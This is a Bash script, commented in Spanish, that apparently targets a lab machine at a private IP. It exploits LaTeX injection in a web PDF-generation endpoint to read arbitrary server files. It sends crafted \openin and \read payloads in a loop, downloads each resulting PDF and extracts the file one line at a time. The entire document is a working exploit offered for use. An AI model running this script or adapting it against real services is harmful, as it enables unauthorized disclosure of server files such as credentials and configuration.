#!/bin/bash
# Este script se encargara de obtener los archivos a partir de una latex injection
tput civis
trap ctrl_c INT

# colores
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m' # No colores

# var
declare -r URL="http://192.168.1.14:80/ajax.php"
filename=$1

function ctrl_c()
{
    echo -e "\n${RED}[*] Saliendo...${NC}"
    tput cnorm
    exit 0
}

function main()
{
    if [ $1 ]; then
       
        read_file_to_line="%0A\read\file%20to\line"
       rm -f *.pdf
       rm -f *.txt
        
        for i in $(seq 1 100); do
            url_pdf=$(curl -s -X POST $URL -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d "content=\newread\file%0A\openin\file=$filename$read_file_to_line%0A\text{\line}%0A\closein\file%0A&template=blank" | grep -i download |  awk 'NF{print $NF}')
            
            if [ $url_pdf ]; then

                archivo_pdf=$(echo $url_pdf | tr '/' ' ' | awk '{print $NF}')
                wget $url_pdf &> /dev/null
                pdftotext $archivo_pdf

                # guardo el nombre del archivo en .txt para poder catearlo
                archivo_txt=$(echo $archivo_pdf | sed 's/\.pdf/\.txt/')
                cat $archivo_txt | head -n 1
                rm -f $archivo_pdf
                rm -f $archivo_txt
                read_file_to_line+="%0A\read\file%20to\line"
            else
                read_file_to_line+="%0A\read\file%20to\line"
            fi
        done
    else
        echo -e "${RED}[*] Uso: ./get_files.sh <filename>${NC}"
        tput cnorm
        exit 1
    fi

}


echo -e "${CYAN}[*] Iniciando petición...${NC}"
main $filename

tput cnorm
